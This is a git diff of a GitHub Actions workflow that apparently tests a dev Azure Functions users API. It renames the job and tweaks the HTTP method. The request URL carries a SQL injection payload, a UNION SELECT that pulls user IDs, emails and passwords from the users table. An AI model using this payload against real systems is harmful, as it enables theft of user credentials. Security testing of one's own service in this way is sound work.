@@ -1,4 +1,4 @@
-name: sql-injection-userId
+name: sql-injection-userID
 on: [push]
 
 jobs:
@@ -18,4 +18,5 @@ jobs:
         uses: satak/webrequest-action@master
         with:
           url: 'https://nsc-func-dev-usw2-tuesday.azurewebsites.net/api/users/14641 UNION select userid, userid, email, userpassword from users/tasks'
-          method: GET
+          method: Get
+          
